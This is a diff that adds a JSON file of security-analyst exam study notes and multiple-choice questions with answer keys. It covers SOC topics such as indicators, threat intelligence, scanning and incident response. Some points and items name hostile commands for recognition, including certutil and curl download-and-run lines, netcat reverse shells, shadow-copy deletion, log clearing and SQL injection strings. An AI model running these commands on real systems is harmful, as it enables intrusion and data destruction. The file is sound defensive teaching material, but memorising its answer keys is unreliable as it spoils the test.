@@ -1,0 +1,1442 @@
+{
+ "deep": [
+  {
+   "o": "1.1",
+   "title": "Infrastructure models and where visibility goes",
+   "points": [
+    "Virtualization: a hypervisor shares hardware between full guest operating systems. Watch for snapshot sprawl, unpatched templates and hypervisor access.",
+    "Containers share the host kernel and are built from images. Control image provenance, scan images, and use runtime isolation; send logs off the container because it is short-lived.",
+    "Serverless: the provider runs servers and the operating system, you own function code, permissions and data. Monitor through provider logs and keep each function's role least-privilege.",
+    "Shared responsibility: the provider secures the cloud itself; you secure what you configure and store in it. Misconfiguration is your risk in every model."
+   ]
+  },
+  {
+   "o": "1.1",
+   "title": "Operating system and device concepts to recognize",
+   "points": [
+    "Windows persistence and evidence: registry Run keys (HKCU and HKLM), services, scheduled tasks, and Security event log entries such as 4624 (logon), 4625 (failed logon) and 4672 (special privileges).",
+    "Linux: /etc/passwd and /etc/shadow, authentication logs (auth.log or secure), cron jobs, systemd units and configuration files under /etc.",
+    "Hardening: remove unused services, apply least privilege, patch, and apply a baseline such as CIS. Hardware roots of trust include TPM, secure boot and HSMs.",
+    "Device management: MDM or UEM enforces configuration, can separate work data from personal data, and supports selective or full remote wipe."
+   ]
+  },
+  {
+   "o": "1.1",
+   "title": "Critical infrastructure and data protection",
+   "points": [
+    "OT and ICS (SCADA, PLCs) prioritize availability and safety first. The Purdue model layers field devices up to the enterprise network; keep OT segmented from IT and use passive monitoring.",
+    "When a legacy OT device cannot be patched, use compensating controls: segmentation, allow-listing, strict access and monitoring.",
+    "Data protection: classify data, then use encryption at rest and in transit, DLP, tokenization (replace with a surrogate), masking (hide part of the value) and key management through PKI or an HSM.",
+    "TLS inspection restores visibility into encrypted traffic but adds privacy, performance and key-handling risk."
+   ]
+  },
+  {
+   "o": "1.2",
+   "title": "Indicators by location",
+   "points": [
+    "Network: beaconing at regular intervals with small, similar requests; unusual outbound volume; scans and sweeps; traffic on unexpected ports; rogue devices; DNS tunneling (long random subdomains, many TXT queries).",
+    "Host: abnormal parent-child processes (a document spawning PowerShell), new scheduled tasks or services, registry Run key changes, unauthorized software, privilege changes, and high CPU, memory or disk use.",
+    "Application: new accounts, unexpected output or errors, unexpected outbound connections and service interruptions.",
+    "Cloud: unusual API calls, new access keys, IAM policy changes, disabled logging, public storage buckets and activity from unfamiliar regions."
+   ]
+  },
+  {
+   "o": "1.2",
+   "title": "Email attacks and living off the land",
+   "points": [
+    "Business email compromise impersonates an executive or vendor to redirect payments. Tells: urgency, new bank details, mismatched Reply-To, lookalike domains.",
+    "Check SPF (sending server authorized), DKIM (message signed) and DMARC (policy plus alignment with the visible From domain). Read the Received headers from the bottom up.",
+    "Obfuscated links use shorteners, lookalike characters or redirects. Inspect the real destination before clicking.",
+    "Living off the land abuses legitimate tools such as PowerShell, WMI, certutil, bitsadmin, rundll32, mshta and PsExec. Detect through unusual command lines, parent processes and rarity, not file hashes."
+   ]
+  },
+  {
+   "o": "1.3",
+   "title": "Decoding and parsing",
+   "points": [
+    "Base64 uses A–Z, a–z, 0–9, + and /, often ends with =, and is encoding, not encryption. PowerShell -EncodedCommand expects Base64 of UTF-16LE text.",
+    "URL encoding replaces characters with %XX (%20 space, %27 single quote, %3C less-than). Decode before judging a web request.",
+    "Hex, ROT13 and single-byte XOR are common lightweight obfuscations. CyberChef or command-line tools decode them; always do it in a safe environment.",
+    "Parse logs with grep, awk, cut, sort and uniq -c, jq for JSON, and regular expressions for patterns."
+   ]
+  },
+  {
+   "o": "1.3",
+   "title": "WHOIS, DNS lookups and scripting languages",
+   "points": [
+    "WHOIS shows registrar, registration and expiry dates and registrant details. A domain registered days ago with hidden registrant details is more suspicious.",
+    "dig and nslookup query DNS: A and AAAA (addresses), MX (mail), NS (name servers), TXT (text, SPF), CNAME (alias), PTR (reverse lookup, dig -x).",
+    "Read regex: . any character, * zero or more, + one or more, ? optional, ^ start, $ end, [ ] character set, \\d digit, \\w word character, { } counts. Read JSON (key/value pairs, arrays in [ ]) and XML (nested tags).",
+    "Recognize SQL injection (' OR 1=1--, UNION SELECT), PowerShell (Verb-Noun cmdlets, -ExecutionPolicy Bypass, IEX, DownloadString), Python (import socket, subprocess) and Bash (pipes, redirects, curl piped into sh)."
+   ]
+  },
+  {
+   "o": "1.3",
+   "title": "Suspicious command patterns",
+   "points": [
+    "Download and run: certutil -urlcache -f, bitsadmin /transfer, curl or wget piped to a shell, PowerShell DownloadString with IEX.",
+    "Proxy execution: mshta with a URL, regsvr32 with /i:http, rundll32 with javascript:, wmic process call create.",
+    "Persistence and privilege: schtasks /create, net user /add, net localgroup administrators /add, new services.",
+    "Impact: vssadmin delete shadows (removes recovery points before ransomware), wevtutil cl (clears logs), netcat with -e (reverse shell)."
+   ]
+  },
+  {
+   "o": "1.4",
+   "title": "Pyramid of Pain and intelligence quality",
+   "points": [
+    "Pyramid of Pain from easiest to hardest for the attacker to change: hash values, IP addresses, domain names, network and host artifacts, tools, then TTPs. Detecting higher levels costs the attacker more.",
+    "Rate sources and information separately (Admiralty). Confidence changes the action: high confidence can drive blocking, low confidence belongs in monitoring and hunting until corroborated.",
+    "Intelligence levels: strategic (leadership and trends), operational (campaigns and actor intent), tactical (TTPs and indicators for defenders).",
+    "Timeliness, relevance and accuracy decide usefulness. Stale indicators generate noise."
+   ]
+  },
+  {
+   "o": "1.4",
+   "title": "Collection sources, STRIDE and hunting",
+   "points": [
+    "Sources: OSINT, commercial and open feeds, ISACs and ISAOs for peer sharing, dark web monitoring, honeypots and honeynets, internal telemetry and vulnerability feeds.",
+    "STRIDE threat model: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege. Use it at design time to find threats.",
+    "Threat actors: nation-state (long-term, stealthy, resourced), organized crime (profit), hacktivist (ideology), insider (access and grievance), unskilled attackers (tools others built).",
+    "Hunting starts from a hypothesis tied to intelligence or an ATT&CK technique, searches telemetry, and ends with a new detection, a fix or a documented negative result."
+   ]
+  },
+  {
+   "o": "1.5",
+   "title": "Playbooks, tuning and automation building blocks",
+   "points": [
+    "A playbook guides response to an incident type (roles, decisions, escalation). A runbook gives step-by-step technical instructions for a task and is a good automation candidate.",
+    "Tune rules with narrow, documented exclusions, thresholds and added context. Re-measure precision and missed detections after each change; never suppress blindly.",
+    "Automation parts: APIs (request and response), webhooks (push an event when something happens), plugins and connectors, and SOAR to orchestrate several tools.",
+    "Infrastructure as code and CI/CD make configuration versioned, reviewable and repeatable. Standardize handoffs with ticketing and shift handover notes."
+   ]
+  },
+  {
+   "o": "1.6",
+   "title": "AI use cases and usage policies",
+   "points": [
+    "Good fits: summarizing timelines and alerts, drafting reports, enrichment, anomaly detection, phishing triage and script drafting, all with human verification.",
+    "A usage policy covers approved tools, what data may be entered (classification limits), required human review, logging of prompts and outputs, vendor data-retention terms and periodic accuracy and bias testing.",
+    "Risks to name: hallucination, bias, prompt injection, data poisoning, model inversion and leakage of sensitive data to third parties.",
+    "Do not let an AI agent take high-impact actions without approval and rollback."
+   ]
+  },
+  {
+   "o": "2.1",
+   "title": "Planning scans and choosing a method",
+   "points": [
+    "Plan scope from the asset inventory, schedule within maintenance windows, tune intensity to limit performance impact, and allow scanner traffic through segmentation and firewalls.",
+    "Credentialed scans see installed software and configuration (fewer false positives); non-credentialed scans show the outside view.",
+    "Agent-based scanning covers roaming devices; agentless needs network reach. Active scans probe; passive scans observe traffic and are safer for fragile systems.",
+    "Internal scans find lateral exposure; external scans show what the internet can reach. SAST reads source code without running it; DAST tests the running application."
+   ]
+  },
+  {
+   "o": "2.1",
+   "title": "Frameworks behind scanning requirements",
+   "points": [
+    "PCI DSS governs payment card environments (including regular internal and external scans). CIS Benchmarks give prescriptive hardening settings.",
+    "OWASP supplies web application guidance (Top 10, ASVS, testing guide). ISO/IEC 27001 and 27002 define an information security management system and controls.",
+    "Compliance scanning compares configuration against a baseline; vulnerability scanning looks for known flaws. They answer different questions."
+   ]
+  },
+  {
+   "o": "2.2",
+   "title": "Tools and reading their output",
+   "points": [
+    "Scanners: Nessus, OpenVAS and Qualys find known vulnerabilities. Nmap discovers hosts, ports and versions. Burp Suite and OWASP ZAP are intercepting proxies for web applications. Metasploit validates exploitability.",
+    "A finding normally shows severity, CVE or plugin ID, affected asset, evidence (such as a banner), and a recommended fix. Banner-only evidence can be wrong when vendors backport fixes.",
+    "True positive: reported and real. False positive: reported but not real. True negative: not reported and not present. False negative: not reported but present (often caused by missing access or credentials).",
+    "Validate with an independent method and record the result."
+   ]
+  },
+  {
+   "o": "2.3",
+   "title": "Prioritization inputs and secure coding",
+   "points": [
+    "Combine CVSS severity, EPSS likelihood, CISA KEV (known exploitation), exploit availability, asset criticality, exposure, patch availability and compensating controls.",
+    "A zero-day has no vendor fix when attackers start using it, so isolate, disable the vulnerable feature, virtually patch and monitor.",
+    "Secure coding: validate input against an allow-list, use parameterized queries (stops SQL injection), encode output for the context (stops XSS), apply least privilege, manage secrets and dependencies, and test with SAST and DAST.",
+    "Fix the cause, not only the symptom: sanitizing one parameter does not remove a missing-access-control flaw."
+   ]
+  },
+  {
+   "o": "2.4",
+   "title": "Supply chain, exceptions and control types",
+   "points": [
+    "Supply chain risk comes from vendors, libraries and build pipelines. Keep a software bill of materials (SBOM), verify signatures and integrity, and assess suppliers.",
+    "Control functions: preventive, detective, corrective, compensating, and deterrent. A compensating control stands in when the preferred control is impractical.",
+    "A remediation exception needs a business reason, an accountable owner, compensating controls and an expiry or review date."
+   ]
+  },
+  {
+   "o": "3.3",
+   "title": "Enrichment, timelines and isolation",
+   "points": [
+    "Enrich events with asset owner and criticality, user identity, geolocation and reputation so triage is faster and more accurate.",
+    "Build timelines from several sources after normalizing timestamps to one time zone (UTC) and checking clock accuracy.",
+    "Isolate with EDR network containment, a quarantine VLAN or blocking at the switch. These keep the system and its memory intact and let responders reach it.",
+    "Release a host only after eradication, validation (or rebuild from a known-good image), credential resets and monitoring are in place."
+   ]
+  },
+  {
+   "o": "3.3",
+   "title": "Eradication, recovery and corrective action",
+   "points": [
+    "Eradicate by removing malware and persistence, closing the entry point and resetting credentials. Rebuild from known-good media when integrity is in doubt.",
+    "Recover by restoring from verified backups, validating function, and watching closely for reinfection.",
+    "Corrective actions address the root cause: patching, configuration changes, new detections, training and process updates, each with an owner and date."
+   ]
+  },
+  {
+   "o": "4.2",
+   "title": "Declaring, escalating and handing over incidents",
+   "points": [
+    "Declare an incident when confirmed or highly probable impact to confidentiality, integrity or availability meets defined severity criteria, then follow the escalation matrix.",
+    "Share details on a need-to-know basis. Legal, communications, executives and affected owners get role-appropriate information.",
+    "A shift handover covers current status, evidence handling, open tasks, pending approvals, risks and contacts.",
+    "Regulatory duties depend on sector and location. For example, GDPR requires notifying the supervisory authority without undue delay and within 72 hours of becoming aware of a personal data breach where feasible."
+   ]
+  },
+  {
+   "o": "3.1",
+   "title": "Kill Chain, Diamond Model and ATT&CK compared",
+   "points": [
+    "Cyber Kill Chain stages in order: reconnaissance, weaponization, delivery, exploitation, installation, command and control, actions on objectives. Breaking any link stops the attack; defenders map controls to each stage.",
+    "Diamond Model: every event has an adversary, a capability, infrastructure and a victim. Analysts pivot between features (the same infrastructure used against two victims) to link events and campaigns.",
+    "MITRE ATT&CK catalogs real-world behavior. A tactic is the adversary's goal in a phase (persistence, lateral movement); a technique is how it is achieved (scheduled task, pass-the-hash). Use it to label what you saw and to find detection gaps.",
+    "OSSTMM is a methodology for testing operational security across channels. The OWASP Web Security Testing Guide is the methodology for testing web applications."
+   ]
+  },
+  {
+   "o": "3.2",
+   "title": "Incident response stages and what belongs in each",
+   "points": [
+    "Preparation: plan, roles, tools, training and exercises done before anything happens. Detection and analysis: confirm the incident, scope it, and classify severity.",
+    "Containment limits spread and damage (short term: isolate; long term: segment, rebuild plans). Eradication removes the cause: malware, persistence, vulnerable component, compromised credentials.",
+    "Recovery restores service from known-good sources, validates function, and monitors for recurrence. Post-incident activity captures lessons learned, updates detections and playbooks, and finalizes reporting.",
+    "Tabletop exercises test decisions without touching systems. Severity classification drives escalation, staffing and notification. The incident commander coordinates and holds authority during the response."
+   ]
+  },
+  {
+   "o": "4.1",
+   "title": "What a useful vulnerability report contains",
+   "points": [
+    "Engineers need affected assets, evidence, severity, a concrete fix and an owner. Executives need risk, trends, overdue critical items against policy, and the decision required.",
+    "Useful metrics: mean time to remediate by severity, SLA compliance, vulnerability age and aging backlog, recurring findings, and coverage of the asset inventory by scans.",
+    "Recurring findings that return every quarter point to a process or root-cause problem such as missing baselines, not just missing patches.",
+    "Compliance reports show control status against a standard; risk scorecards translate findings into business impact."
+   ]
+  }
+ ],
+ "questions": [
+  {
+   "id": "ORG-46",
+   "o": "1.1",
+   "q": "A team moves an API to a serverless platform. Which statement best describes how security responsibility changes?",
+   "opts": [
+    "Nothing can be logged on serverless platforms, so security monitoring has to be limited to the network edge",
+    "The team must patch and harden the operating system on every host that runs its functions each month",
+    "The provider manages the servers and operating system, while the team still owns function code, permissions and data",
+    "The provider becomes responsible for flaws in the team's function code and for the IAM policies it attaches"
+   ],
+   "a": 2,
+   "e": "Under the shared responsibility model, serverless shifts server and OS management to the provider. Code, access permissions, configuration and data remain the customer's job. Logging is available through the provider and must be configured."
+  },
+  {
+   "id": "ORG-47",
+   "o": "1.1",
+   "q": "What is a key security-relevant difference between containers and virtual machines?",
+   "opts": [
+    "Containers always provide stronger isolation than virtual machines because their images are smaller in size",
+    "Virtual machines share a single host kernel, while each container carries a complete guest operating system",
+    "Container images cannot be scanned for vulnerabilities, although virtual machine images can be scanned easily",
+    "Containers share the host operating system kernel, while each virtual machine runs its own guest operating system"
+   ],
+   "a": 3,
+   "e": "Containers share the host kernel, so a kernel flaw or poor runtime isolation can affect other containers. VMs run separate guest operating systems on a hypervisor. Container images can and should be scanned."
+  },
+  {
+   "id": "ORG-48",
+   "o": "1.1",
+   "q": "Which registry location is commonly abused to make a program start every time a user logs on?",
+   "opts": [
+    "HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor",
+    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "HKLM\\SAM\\SAM\\Domains\\Account local account data",
+    "HKCR\\.txt\\shell\\open\\command file association"
+   ],
+   "a": 1,
+   "e": "Run keys (under HKCU or HKLM) launch listed programs at logon and are a classic persistence location. The other locations hold hardware descriptions, file type associations and local account data."
+  },
+  {
+   "id": "ORG-49",
+   "o": "1.1",
+   "q": "In an industrial control system environment, which security priority normally comes first?",
+   "opts": [
+    "Encrypting each field device before it is deployed",
+    "Applying every patch immediately, as in office IT",
+    "Availability and safety of the physical process",
+    "Confidentiality of every sensor reading at all times"
+   ],
+   "a": 2,
+   "e": "OT systems control physical processes, so uptime and safety dominate. That is why patching is cautious and compensating controls such as segmentation and passive monitoring are common."
+  },
+  {
+   "id": "ORG-50",
+   "o": "1.1",
+   "q": "A company lets staff read corporate email on personal phones. It wants to separate work data and erase only that data if a phone is lost. Which approach fits best?",
+   "opts": [
+    "A full factory reset of each personal device whenever it leaves the corporate office premises",
+    "Mobile device management with a managed work container and selective wipe",
+    "Emailing every user a polite request to delete corporate messages from their phones themselves",
+    "Blocking all mobile access to email and requiring staff to read printed copies of messages"
+   ],
+   "a": 1,
+   "e": "MDM or UEM can enforce policy, containerize corporate data and remotely wipe just that data. Relying on users, wiping personal devices entirely or banning mobile access fails the stated goal."
+  },
+  {
+   "id": "ORG-51",
+   "o": "1.1",
+   "q": "Developers need realistic customer card data in a test database, but real card numbers must not be exposed. Which control fits best?",
+   "opts": [
+    "Hash every value with MD5 so the field keeps no recognizable format",
+    "Encrypt the test copy with the same key that protects production",
+    "Tokenize or mask the card numbers in the test data",
+    "Copy production data as it is and restrict the test database with an ACL"
+   ],
+   "a": 2,
+   "e": "Tokenization or masking gives realistic, usable values without real card numbers. Copying production exposes the real data to anyone with access, a hash breaks the format and is weak for low-entropy values, and sharing the production key widens exposure."
+  },
+  {
+   "id": "ORG-52",
+   "o": "1.2",
+   "q": "Proxy logs show one workstation contacting the same external domain every 60 seconds with small, identical-size requests around the clock. Which interpretation is most consistent with that pattern, pending verification?",
+   "opts": [
+    "A user streaming a long video",
+    "Normal one-time software installation traffic",
+    "A browser downloading a large file",
+    "Command-and-control beaconing from malware"
+   ],
+   "a": 3,
+   "e": "Regular intervals with similar small requests are a classic beaconing pattern. Verify against known software that polls on a schedule, then investigate the host. Streaming and large downloads look very different, and an installation is not repeated all day."
+  },
+  {
+   "id": "ORG-53",
+   "o": "1.2",
+   "q": "A host sends thousands of DNS TXT queries with long, random-looking subdomains to one external domain. What is the most likely activity?",
+   "opts": [
+    "A scheduled zone transfer between two internal DNS servers that replicate their zones",
+    "DNS tunneling used for exfiltration or command and control",
+    "Users browsing many different websites at the same time from several office laptops",
+    "A normal DNS cache refresh that happens after a network outage has been resolved by the ISP"
+   ],
+   "a": 1,
+   "e": "Encoding data into long subdomains and using TXT records are hallmarks of DNS tunneling. Normal browsing queries many different domains, and zone transfers use different mechanisms and servers."
+  },
+  {
+   "id": "ORG-54",
+   "o": "1.2",
+   "q": "EDR shows winword.exe spawning powershell.exe with an encoded command. Which interpretation is best?",
+   "opts": [
+    "Normal spell-check and grammar behavior inside Microsoft Word that runs a helper script for the user",
+    "Windows Update installing its monthly cumulative patch through a signed PowerShell script on the host",
+    "A malicious macro or document exploit launching a payload through an unusual parent-child process relationship",
+    "A printer driver being installed for the user through a background PowerShell command at logon"
+   ],
+   "a": 2,
+   "e": "Office applications rarely spawn PowerShell, and an encoded command adds suspicion. Isolate the host and examine the document and the decoded command. The alternatives are not behaviors of Word."
+  },
+  {
+   "id": "ORG-55",
+   "o": "1.2",
+   "q": "Cloud audit logs show a new access key created for an administrator at 03:00, followed by logging being disabled. What is the best first response?",
+   "opts": [
+    "Record it as routine maintenance by the administrator and review the change at the next quarterly audit",
+    "Wait for the administrator to report a problem before taking any action on the new access key",
+    "Delete the administrator account immediately, before any logs or session details can be preserved",
+    "Treat it as suspected account compromise: disable the key, preserve logs and investigate the session"
+   ],
+   "a": 3,
+   "e": "A new key plus disabled logging is a strong persistence and defense-evasion pattern. Contain the credential, preserve what evidence exists, and investigate. Deleting the account destroys evidence and waiting leaves access open."
+  },
+  {
+   "id": "ORG-56",
+   "o": "1.2",
+   "q": "An accountant receives an email that appears to be from the CEO, urging an urgent wire to a new account, with a Reply-To address at a free webmail service. Which attack is this?",
+   "opts": [
+    "A SQL injection attempt against the mail server",
+    "Business email compromise through impersonation",
+    "A distributed denial-of-service attack",
+    "A watering hole attack on a news site"
+   ],
+   "a": 1,
+   "e": "Urgent payment requests from a spoofed executive with a mismatched Reply-To are the BEC pattern. Verify through a separate channel before any payment."
+  },
+  {
+   "id": "ORG-57",
+   "o": "1.2",
+   "q": "Which activity best fits the description living off the land?",
+   "opts": [
+    "Cloning a bank login page to harvest credentials from users who follow an emailed link",
+    "Installing a custom remote access trojan that ships with its own dedicated installer program",
+    "Exploiting a kernel zero-day vulnerability to gain SYSTEM privileges on the target workstation",
+    "Using certutil.exe to download a file and rundll32.exe to run it"
+   ],
+   "a": 3,
+   "e": "Living off the land abuses legitimate tools already on the system, which blends in and avoids dropping obvious malware. Detect it with command-line and parent-process analysis."
+  },
+  {
+   "id": "ORG-58",
+   "o": "1.3",
+   "q": "PowerShell is launched with -EncodedCommand followed by a long string. How should an analyst understand what it does?",
+   "opts": [
+    "Compare the string against a list of known file hashes and ignore it if no entry matches",
+    "Block PowerShell on every host and close the case without ever reading the encoded command",
+    "Decode the Base64 text (UTF-16LE) in a safe environment and read the command",
+    "Run the encoded string on a production server and observe whatever output it produces there"
+   ],
+   "a": 2,
+   "e": "-EncodedCommand carries Base64 of UTF-16LE text. Decoding it reveals the real command. Running it risks harm, and a hash check does not read the content."
+  },
+  {
+   "id": "ORG-59",
+   "o": "1.3",
+   "q": "A web server log shows a request containing %27%20OR%201%3D1--. What does it decode to, and what does it indicate?",
+   "opts": [
+    "<script>alert(1)</script>, a cross-site scripting attempt",
+    "A normal search string typed by a user",
+    "' OR 1=1--, a SQL injection attempt",
+    "../../etc/passwd, a directory traversal attempt"
+   ],
+   "a": 2,
+   "e": "%27 is a single quote, %20 a space, %3D an equals sign. The decoded text is a classic always-true SQL injection condition."
+  },
+  {
+   "id": "ORG-60",
+   "o": "1.3",
+   "q": "A phishing email links to a domain. Which WHOIS finding increases suspicion the most?",
+   "opts": [
+    "The domain was registered ten years ago and has renewed automatically every single year since",
+    "The domain's registration lists the company's published street address and a working phone number",
+    "The domain uses a well-known registrar and standard name servers like thousands of other domains",
+    "The domain was registered a few days ago with the registrant details hidden"
+   ],
+   "a": 3,
+   "e": "Newly registered domains with hidden details are common in phishing infrastructure, though not proof by themselves. Old, stable registrations with consistent details are less suspicious."
+  },
+  {
+   "id": "ORG-61",
+   "o": "1.3",
+   "q": "Which command shows the mail servers responsible for a domain?",
+   "opts": [
+    "dig example.com MX",
+    "dig example.com NS",
+    "dig -x 192.0.2.10",
+    "dig example.com TXT"
+   ],
+   "a": 0,
+   "e": "MX records list mail exchangers. NS lists name servers, -x performs a reverse lookup, and TXT returns text records such as SPF."
+  },
+  {
+   "id": "ORG-62",
+   "o": "1.3",
+   "q": "What does the regular expression ^\\d{3}-\\d{2}-\\d{4}$ match?",
+   "opts": [
+    "A value formatted like a US Social Security number, such as 123-45-6789",
+    "An IPv4 address made of four dotted sections, such as 192.168.1.10 and similar values",
+    "A US telephone number that includes a three-digit area code, such as 212-555-0143",
+    "A calendar date written as year, month and day with hyphens between each part"
+   ],
+   "a": 0,
+   "e": "Three digits, a hyphen, two digits, a hyphen and four digits, anchored at both ends, is the SSN pattern. Such expressions are used in DLP and log searches."
+  },
+  {
+   "id": "ORG-63",
+   "o": "1.3",
+   "q": "Which text in a login form field most clearly indicates an attempt to steal data from a database?",
+   "opts": [
+    "A long passphrase made of four random dictionary words",
+    "' UNION SELECT username, password FROM users--",
+    "John.Smith@example.com entered as the account name",
+    "My favorite team is Select United, please sign me in"
+   ],
+   "a": 1,
+   "e": "UNION SELECT appends the attacker's query to the application's query to return other tables' data. The other values are ordinary input."
+  },
+  {
+   "id": "ORG-64",
+   "o": "1.3",
+   "q": "Which command line on a user workstation is the most suspicious?",
+   "opts": [
+    "ipconfig /all > C:\\Temp\\network.txt for a support ticket",
+    "certutil -urlcache -split -f http://203.0.113.9/a.exe a.exe",
+    "nslookup www.example.com 8.8.8.8 to check name resolution",
+    "ping -n 4 8.8.8.8 to test internet connectivity"
+   ],
+   "a": 1,
+   "e": "certutil is a certificate tool; using it to fetch an executable from a remote host is a common download technique. The other commands are routine diagnostics, though context still matters."
+  },
+  {
+   "id": "ORG-65",
+   "o": "1.3",
+   "q": "A host runs vssadmin delete shadows /all /quiet, and many files are then renamed with a new extension. What is most likely happening?",
+   "opts": [
+    "A user is compressing old documents into archives to save space on the local drive",
+    "A routine disk cleanup is freeing storage space by removing old restore points",
+    "A backup agent is rotating its snapshots on its normal schedule before the next job",
+    "Ransomware is removing recovery points and encrypting files"
+   ],
+   "a": 3,
+   "e": "Deleting volume shadow copies silently prevents easy restore, and mass renames follow encryption. Isolate the host immediately and preserve memory if possible."
+  },
+  {
+   "id": "ORG-66",
+   "o": "1.4",
+   "q": "According to the Pyramid of Pain, which type of indicator causes attackers the most difficulty when defenders can detect it?",
+   "opts": [
+    "Tactics, techniques and procedures",
+    "IP addresses of command-and-control servers",
+    "File hash values of known malware samples",
+    "Domain names used for phishing or delivery"
+   ],
+   "a": 0,
+   "e": "Hashes, IPs and domains are trivial to change. TTPs reflect how the adversary operates, so changing them forces new training, tools and tradecraft."
+  },
+  {
+   "id": "ORG-67",
+   "o": "1.4",
+   "q": "A report with low confidence says a new actor uses a particular IP range. What is the most appropriate use?",
+   "opts": [
+    "Block the entire range at the perimeter firewall immediately to be safe, without waiting for corroboration",
+    "Add it to monitoring and hunting while seeking corroboration before broad blocking",
+    "Publish it to partner organizations as a confirmed indicator so that they can block it too",
+    "Discard the report permanently because low-confidence intelligence can never be useful to defenders"
+   ],
+   "a": 1,
+   "e": "Confidence should shape the response. Low-confidence intelligence is useful for watching and hunting, but blocking a range could cause outages and publishing it as confirmed would mislead others."
+  },
+  {
+   "id": "ORG-68",
+   "o": "1.4",
+   "q": "Which source is best for sharing sector-specific threat information among peer organizations?",
+   "opts": [
+    "Internal HR records kept by the personnel office",
+    "A vendor's marketing brochure about its newest product",
+    "Unverified posts shared on public social media",
+    "An information sharing and analysis center (ISAC)"
+   ],
+   "a": 3,
+   "e": "ISACs and ISAOs are trusted communities where members in the same sector share indicators, campaigns and mitigation advice."
+  },
+  {
+   "id": "ORG-69",
+   "o": "1.4",
+   "q": "Logging is disabled on a finance system, so no one can prove who approved a change. Which STRIDE category does this weakness represent?",
+   "opts": [
+    "Information disclosure",
+    "Repudiation",
+    "Elevation of privilege",
+    "Spoofing"
+   ],
+   "a": 1,
+   "e": "Repudiation is the ability to deny an action because there is no reliable evidence. Auditing and tamper-resistant logs mitigate it. Spoofing is forging identity, disclosure is data exposure, and elevation is gaining higher rights."
+  },
+  {
+   "id": "ORG-70",
+   "o": "1.4",
+   "q": "An actor with substantial resources steals source code and trade secrets for a foreign industry and maintains quiet access for years. Which actor type fits best?",
+   "opts": [
+    "An unskilled attacker using downloaded tools",
+    "A nation-state or advanced persistent threat",
+    "A hacktivist protesting a company's policies",
+    "An opportunistic criminal seeking quick ransom payments"
+   ],
+   "a": 1,
+   "e": "Long-term, stealthy, well-resourced espionage matches nation-state activity. Hacktivists seek publicity, unskilled attackers use others' tools, and criminals typically seek fast profit."
+  },
+  {
+   "id": "ORG-71",
+   "o": "1.4",
+   "q": "What is the best starting point for a threat hunt?",
+   "opts": [
+    "A cleanup of the spam quarantine folder to remove messages older than thirty days",
+    "A random sample of firewall rule names pulled from last quarter's configuration backup",
+    "The next scheduled vulnerability scan report once it has been delivered to management",
+    "A hypothesis based on intelligence about techniques used against similar organizations"
+   ],
+   "a": 3,
+   "e": "Hunting is hypothesis-driven: pick a technique or actor behavior, define what evidence it would leave, then search telemetry for it."
+  },
+  {
+   "id": "ORG-72",
+   "o": "1.5",
+   "q": "Which statement best distinguishes a runbook from a playbook?",
+   "opts": [
+    "A runbook gives step-by-step instructions for one task; a playbook guides response to an incident type",
+    "A runbook is written only for executives to read, while a playbook is written only for engineers to follow",
+    "They are identical documents that differ only in file format and the department that stores them",
+    "A runbook describes the corporate budget for security, while a playbook lists every vendor contact"
+   ],
+   "a": 0,
+   "e": "Playbooks structure how a type of incident is handled, including decisions and escalation. Runbooks are executable procedures that are good candidates for automation."
+  },
+  {
+   "id": "ORG-73",
+   "o": "1.5",
+   "q": "A detection rule produces 300 false positives daily because an approved vulnerability scanner trips it. What is the best tuning action?",
+   "opts": [
+    "Add a narrow, documented exclusion for the scanner's approved addresses and re-measure",
+    "Disable the rule for every host in the organization until the scanner finishes its weekly run",
+    "Raise the rule's severity so that analysts pay closer attention to every one of these alerts",
+    "Ignore every alert that originates from any internal address, whatever the rule and the host"
+   ],
+   "a": 0,
+   "e": "Targeted exclusions remove known benign noise while preserving detection elsewhere. Disabling or broad suppression creates blind spots. Review the change later to confirm no real detections were lost."
+  },
+  {
+   "id": "ORG-74",
+   "o": "1.5",
+   "q": "Which mechanism lets a SIEM push an event to a SOAR platform immediately when an alert fires?",
+   "opts": [
+    "Manual copy-and-paste by an analyst",
+    "A weekly CSV export emailed to the team",
+    "A printed report delivered each morning",
+    "A webhook"
+   ],
+   "a": 3,
+   "e": "A webhook sends an HTTP call when an event occurs, enabling near real-time orchestration. Batch exports and manual steps add delay and error."
+  },
+  {
+   "id": "ORG-75",
+   "o": "1.5",
+   "q": "Why does infrastructure as code improve security operations?",
+   "opts": [
+    "It removes the need for any access control or monitoring on the cloud accounts that use it",
+    "Configurations are versioned, reviewable and repeatable, which reduces drift and manual error",
+    "It guarantees that every system it deploys is permanently free of vulnerabilities and misconfiguration",
+    "It prevents attackers from ever reading the configuration files because the code is compiled"
+   ],
+   "a": 1,
+   "e": "Treating infrastructure as code lets teams review changes, roll back, and deploy consistent secure baselines. It does not remove the need for access control or guarantee that code is flaw-free."
+  },
+  {
+   "id": "ORG-76",
+   "o": "1.5",
+   "q": "A SOC wants phishing reports handled the same way on every shift. Which action is best?",
+   "opts": [
+    "Delay handling of phishing reports until the weekly team meeting so the group can decide together",
+    "Let each analyst use whatever method they prefer on their own shift, as long as reports are closed",
+    "Assign every phishing report to the most senior analyst so that only one person handles them",
+    "Create a documented, tested phishing playbook with defined steps and escalation criteria"
+   ],
+   "a": 3,
+   "e": "Standardization comes from documented, practiced procedures. Individual preference creates inconsistency, a single owner is a bottleneck, and delay lets phishing spread."
+  },
+  {
+   "id": "ORG-77",
+   "o": "1.5",
+   "q": "An analyst manually copies indicators from a threat feed into the SIEM each morning. Which improvement is best?",
+   "opts": [
+    "Ingest the feed automatically through its API or a connector, with validation and expiry",
+    "Stop using the feed altogether, since some manual work is unavoidable in a security operations center",
+    "Ask a second analyst to copy the same indicators by hand each morning so errors are caught",
+    "Email the full list of indicators to every team member every morning so they can each check it"
+   ],
+   "a": 0,
+   "e": "Automated ingestion removes repetitive work and delays. Add validation, deduplication and expiry so stale indicators do not create noise."
+  },
+  {
+   "id": "ORG-78",
+   "o": "1.6",
+   "q": "Which element is most important in an AI usage policy for a SOC?",
+   "opts": [
+    "A ban on logging the assistant's prompts and responses, to keep analysts' work private",
+    "A requirement that every alert is closed by the AI assistant alone, without any analyst involvement",
+    "Approved tools, data-handling limits and required human review of outputs",
+    "Permission to paste any internal data into any public model whenever it speeds up an investigation"
+   ],
+   "a": 2,
+   "e": "A policy should define which tools are allowed, what data can be entered, and that humans verify consequential outputs. Logging supports audit, and unrestricted data entry creates leakage risk."
+  },
